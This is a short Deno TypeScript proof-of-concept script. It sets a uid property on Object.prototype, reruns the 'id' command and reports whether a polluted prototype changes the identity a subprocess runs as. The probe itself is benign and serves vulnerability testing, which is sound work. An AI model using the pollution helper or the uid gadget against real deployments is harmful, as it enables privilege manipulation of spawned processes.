const decoder = new TextDecoder("utf-8");

function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

let unpolluted: string | null = null;
{
    const process = new Deno.Command("id");
    const { stdout } = await process.output();
    unpolluted = decoder.decode(stdout);
}

let polluted: string | null = null;
try {
    pollute("uid", 1337);
    const process = new Deno.Command("id");
    const { stdout } = await process.output();
    polluted = decoder.decode(stdout);
} catch (_) { }

if (unpolluted !== polluted) {
    console.log("Your Deno version is vulnerable to this gadget.");
} else {
    console.log("Your Deno version is NOT affected.");
}
